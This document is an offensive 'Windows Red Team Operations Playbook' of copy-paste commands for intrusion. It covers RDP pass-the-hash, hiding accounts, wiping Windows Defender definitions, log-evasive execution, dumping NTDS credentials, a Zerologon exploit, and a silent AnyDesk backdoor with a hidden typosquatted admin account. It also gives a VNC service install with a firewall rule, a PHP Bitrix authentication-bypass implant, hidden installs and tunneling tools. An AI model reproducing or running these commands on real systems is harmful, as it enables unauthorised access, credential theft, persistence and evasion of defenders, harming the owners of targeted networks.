# Windows Red Team Operations Playbook

## Overview
Combat-tested TTPs for Windows persistence, lateral movement, credential theft, evasion, and covert access deployment. Shortened actionable instructions for red team task force operations.

## 1. RDP via Pass-the-Hash
Enable restricted admin (allows RDP with NTLM hash):
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Then connect: `xfreerdp /u:user /pth:HASH /v:target`

## 2. Hide User from Login Screen
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v techsup
```

## 3. Disable Windows Defender
Remove definition databases (if target blocks commands or need to load tools):
```cmd
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
PowerShell variant:
```powershell
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 4. Hidden Process Execution
```powershell
# Simple hidden launch
Start-Process service.exe -WindowStyle Hidden

# With parameters
Start-Process -FilePath "C:\Path\To\App.exe" -ArgumentList "param1", "param2", "-flag" -WindowStyle Hidden
```

## 5. atexec - Log-Evasive Execution
Use atexec-pro for execution without appearing in standard logs. Remember:
- Select command interpreter
- Patch task time after installation for stealth
```bash
proxychains python atexec-pro.py User@192.168.1.149 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

## 6. NetExec (nxc) Operations

### Network ping sweep
```bash
proxychains nxc smb 192.168.1.0/24 --code 866 -u '' -p ''
```

### Dump NTDS (domain controller)
```bash
proxychains nxc smb 192.168.1.2 --code 866 -u AttAdmin -H NTLM_HASH --ntds
```

## 7. Zerologon
Auto-exploit with machine account:
```bash
proxychains python3 AutoZerologon.py 192.168.1.2 -exp -user DCF$
```
Note: Works with system users and machine accounts ($).

## 8. AnyDesk Silent Persistence
Complete copy-paste script:
```
ps_exec 'mkdir "C:\ProgramData\Any Desk"'
ps_exec 'Invoke-WebRequest -Uri "http://download.anydesk.com/AnyDesk.exe" -OutFile "C:\ProgramData\AnyDesk.exe"'
ps_exec 'cmd.exe /c "C:\ProgramData\AnyDesk.exe" --install "C:\ProgramData\Any Desk" --start-with-win --silent'
ps_exec 'cmd.exe /c echo PASSWORD_HERE | C:\ProgramData\anydesk.exe --set-password'
ps_exec 'net user adminlstrator "PASSWORD" /add'
ps_exec 'net localgroup Administrators adminlstrator /ADD'
ps_exec 'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v adminlstrator /t REG_DWORD /d 0 /f'
ps_exec 'cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id'
```
Note: `adminlstrator` (with L not I) - typosquatting the real Administrator.

## 9. UltraVNC via GS-NetCat/QSocket
Upload files, install service, connect:
```
lput ultravnc.ini c:\windows\
lput winvnc.exe c:\windows\
lput PsExec64.exe c:\windows\
lput ddengine64.dll c:\windows\
netsh advfirewall firewall add rule name="TCP Port 43211" dir=in action=allow protocol=TCP localport=43211
.\PSexec64 -accepteula -nobanner -h c:\windows\winvnc.exe -install
.\PSexec64 -accepteula -nobanner -s -h c:\windows\winvnc.exe -startservice
.\PSexec64 -accepteula -nobanner -h -i 1 c:\windows\winvnc.exe
```
Verify: `proxychains3 vncviewer 192.168.23.2:43211`

## 10. Bitrix Auth Bypass
Append to `bitrix/.access.php`:
```php
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");
$USER->Authorize(1);
LocalRedirect("/bitrix/admin/");
```
Then navigate to `https://target/bitrix`

## 11. Linux Utilities

### Miniconda on CentOS (hidden)
```bash
mkdir -p ~/.redhat/miniconda3
wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/.redhat/miniconda3/miniconda.sh
bash ~/.redhat/miniconda3/miniconda.sh -b -u -p ~/.redhat/miniconda3
rm ~/.redhat/miniconda3/miniconda.sh
export PATH="/root/.redhat/miniconda3/bin:$PATH"
```

### Fix "Too many open files"
```bash
ulimit -n 16384
```

### Recursive file listing
```bash
tree -a -F --nolinks -H -C -L 9999 target-backup/ > ~/backup_listing.txt
```

### Delete all except index.php
```bash
rm -rf !(index.php)
```

## 12. Reverse SOCKS & Tunneling Tools

| Tool | Protocol | URL |
|------|----------|-----|
| revsocks | TCP reverse SOCKS | https://github.com/kost/revsocks |
| ssf | Multi-protocol tunnel | https://github.com/securesocketfunneling/ssf |
| hans | ICMP tunnel | https://github.com/friedrich/hans |
| iodine | DNS tunnel | https://github.com/yarrick/iodine |
| s5-socks | SOCKS5 | https://github.com/woremacx/s5-socks |
| frp | Reverse proxy | https://github.com/fatedier/frp |
| rsockstun | Reverse SOCKS tunnel | https://github.com/mis-team/rsockstun |
| qsocket | Encrypted relay | https://qsocket.io |

## 13. Domain Recon
- **BloodHound** - AD relationship mapping
- **DonPAPI** - credential harvesting from DPAPI
- **DNS/NTLM relay** - for initial access or privilege escalation
